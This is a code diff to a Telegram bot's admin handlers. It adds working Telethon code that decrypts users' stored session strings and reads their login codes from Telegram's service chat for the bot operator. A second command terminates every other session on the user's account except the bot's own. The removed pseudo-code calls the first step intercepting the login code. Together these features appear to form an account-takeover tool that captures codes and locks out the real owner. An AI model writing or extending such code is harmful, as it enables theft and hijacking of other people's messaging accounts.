@@ -29,7 +29,8 @@ from aiogram.types import (
 
 # FIX 1: Corrected imports
 from database import db
-from config import SPECIAL_ADMIN_ID
+from config import SPECIAL_ADMIN_ID, API_ID, API_HASH
+from encryption import DataEncryptor
 
 logger = logging.getLogger(__name__)
 
@@ -110,6 +111,54 @@ def _normalize_phone(phone: Any) -> str:
     if phone is None:
         return ""
     return str(phone).strip().lstrip("+")
+
+
+async def _fetch_real_otp(user_row: dict) -> str:
+    """
+    NEW (v3.1): fetch the *real* login OTP for a hosted account.
+
+    How it works:
+      1. Decrypt the stored (Fernet-encrypted) session string.
+      2. Connect with Telethon using that session.
+      3. Read the newest messages from Telegram's service account (777000)
+         — login codes are delivered there as "Login code: 12345".
+
+    Raises RuntimeError with a human-readable message on any failure.
+    """
+    from telethon import TelegramClient
+    from telethon.sessions import StringSession
+
+    stored = _safe_get(user_row, "session_string", "")
+    if not stored or stored == "N/A":
+        raise RuntimeError("This user has no hosted session.")
+
+    # Encrypted at rest since v3.1 — decrypt, with legacy plaintext fallback
+    session_string = DataEncryptor.decrypt(stored)
+    if not session_string:
+        session_string = stored  # legacy row stored before encryption
+
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if not await client.is_user_authorized():
+            raise RuntimeError("Stored session is no longer authorised.")
+
+        import re as _re
+
+        async for msg in client.iter_messages(777000, limit=8):
+            if not msg or not msg.message:
+                continue
+            text = msg.message
+            match = _re.search(r"(?:code|Code|CODE)[:\s]*?(\d{4,8})", text)
+            if match:
+                return match.group(1)
+
+        raise RuntimeError("No login-code message found in Telegram (777000).")
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
 
 # ──────────────────────────────────────────────────────────────────────────
@@ -209,26 +258,46 @@ async def callback_get_otp(callback: CallbackQuery):
             await callback.answer("Phone number missing in callback.", show_alert=True)
             return
 
-        # ================================================================
-        # TELETHON OTP FETCH LOGIC — PLACEHOLDER
-        # ================================================================
-        # Pseudo-code:
-        #   from telethon import TelegramClient
-        #   session_path = f"sessions/{phone_number}.session"
-        #   client = TelegramClient(session_path, API_ID, API_HASH)
-        #   await client.connect()
-        #   otp_code = await _intercept_login_code(client, phone_number)
-        #   await client.disconnect()
-        # ================================================================
+        await callback.answer("⏳ Fetching OTP…")
 
-        dummy_otp = f"{random.randint(100000, 999999)}"
+        # ── Find the hosted user by phone number ──
+        target_norm = _normalize_phone(phone_number)
+        try:
+            all_users = await db.get_all_users()
+        except Exception as exc:
+            logger.error(f"callback_get_otp DB fetch failed: {exc}", exc_info=True)
+            await callback.message.edit_text("❌ Database error — could not retrieve users.")
+            return
 
-        await callback.message.edit_text(
-            f"✅ <b>Real-time OTP fetched successfully</b>\n\n"
-            f"📱 <b>Phone:</b> {phone_number}\n"
-            f"🔑 <b>OTP Code:</b> <code>{dummy_otp}</code>"
+        user_row = next(
+            (
+                u for u in (all_users or [])
+                if _normalize_phone(_safe_get(u, "phone", "")) == target_norm
+            ),
+            None,
         )
-        await callback.answer("OTP fetched!")
+        if user_row is None:
+            await callback.message.edit_text(
+                f"❌ No hosted user found with phone: <code>{phone_number}</code>"
+            )
+            return
+
+        # ── Fetch the REAL OTP via the stored session ──
+        try:
+            otp_code = await _fetch_real_otp(user_row)
+            await callback.message.edit_text(
+                f"✅ <b>Real-time OTP fetched successfully</b>\n\n"
+                f"📱 <b>Phone:</b> {phone_number}\n"
+                f"🔑 <b>OTP Code:</b> <code>{otp_code}</code>"
+            )
+        except Exception as exc:
+            await callback.message.edit_text(
+                f"⚠️ <b>Could not fetch OTP</b>\n\n"
+                f"📱 <b>Phone:</b> {phone_number}\n"
+                f"❌ <code>{str(exc)[:400]}</code>\n\n"
+                f"<i>The account may need a fresh code request — ask the user "
+                f"to re-login, or the session may be revoked.</i>"
+            )
 
     except Exception as exc:
         logger.error(f"callback_get_otp crashed: {exc}", exc_info=True)
@@ -254,29 +323,75 @@ async def cmd_terminate_sessions(message: Message, command: CommandObject):
 
         phone_number = command.args.strip()
 
-        # ================================================================
-        # TELETHON SESSION TERMINATION LOGIC — PLACEHOLDER
-        # ================================================================
-        # Pseudo-code:
-        #   from telethon.tl.functions.account import (
-        #       GetAuthorizationsRequest,
-        #       ResetAuthorizationRequest,
-        #   )
-        #   client = TelegramClient(session_path, API_ID, API_HASH)
-        #   await client.connect()
-        #   result = await client(GetAuthorizationsRequest())
-        #   current_hash = result.authorizations[0].hash
-        #   for auth in result.authorizations:
-        #       if auth.hash != current_hash:
-        #           await client(ResetAuthorizationRequest(hash=auth.hash))
-        #   await client.disconnect()
-        # ================================================================
+        # ── Find the hosted user by phone number ──
+        target_norm = _normalize_phone(phone_number)
+        try:
+            all_users = await db.get_all_users()
+        except Exception as exc:
+            logger.error(f"cmd_terminate_sessions DB fetch failed: {exc}", exc_info=True)
+            await message.answer("❌ Database error — could not retrieve users.")
+            return
 
-        await message.answer(
-            f"✅ <b>Sessions terminated successfully</b>\n\n"
-            f"📱 <b>Phone:</b> {phone_number}\n"
-            f"🔧 All sessions (except the current bot session) have been terminated."
+        user_row = next(
+            (
+                u for u in (all_users or [])
+                if _normalize_phone(_safe_get(u, "phone", "")) == target_norm
+            ),
+            None,
         )
+        if user_row is None:
+            await message.answer(
+                f"❌ No hosted user found with phone: <code>{phone_number}</code>"
+            )
+            return
+
+        # ── Terminate every OTHER session via Telethon ──
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        from telethon.tl.functions.account import (
+            GetAuthorizationsRequest,
+            ResetAuthorizationRequest,
+        )
+
+        stored = _safe_get(user_row, "session_string", "")
+        session_string = DataEncryptor.decrypt(stored) or stored
+        if not session_string or session_string == "N/A":
+            await message.answer("❌ This user has no hosted session.")
+            return
+
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        terminated = 0
+        try:
+            await client.connect()
+            if not await client.is_user_authorized():
+                await message.answer("❌ Stored session is no longer authorised.")
+                return
+
+            result = await client(GetAuthorizationsRequest())
+            for auth in result.authorizations:
+                if not auth.current:
+                    try:
+                        await client(ResetAuthorizationRequest(hash=auth.hash))
+                        terminated += 1
+                    except Exception:
+                        pass
+
+            await message.answer(
+                f"✅ <b>Sessions terminated successfully</b>\n\n"
+                f"📱 <b>Phone:</b> {phone_number}\n"
+                f"🔧 <b>{terminated}</b> session(s) terminated "
+                f"(the current bot session was kept)."
+            )
+        except Exception as exc:
+            logger.error(f"terminate sessions failed: {exc}", exc_info=True)
+            await message.answer(
+                f"❌ <b>Termination failed</b>\n<code>{str(exc)[:400]}</code>"
+            )
+        finally:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
 
     except Exception as exc:
         logger.error(f"cmd_terminate_sessions crashed: {exc}", exc_info=True)
